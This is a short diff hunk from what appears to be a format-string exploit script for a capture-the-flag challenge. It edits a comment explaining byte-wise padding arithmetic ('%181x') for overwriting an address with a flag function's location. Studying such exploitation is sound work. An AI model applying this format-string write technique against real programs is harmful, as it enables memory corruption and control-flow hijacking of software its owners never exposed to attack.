@@ -35,7 +35,7 @@ payload += p32(flag_4)
 # flag 0804870b
 
 # ******AA
-# 0x5d > 0x0b. We need to go 1 byte more -> *0ba = 0x10b
+# 0x5d > 0x0b. Cannot go back. We need to go 1 byte more -> *0ba = 0x10b
 # Reason we went to 0x10b and not 0x70b is that we are focusing on LSB byte - 0x******AA != 0x*****AAA
 # (0x10b - 0x5d) + 8 - 1?
 payload += "%181x"
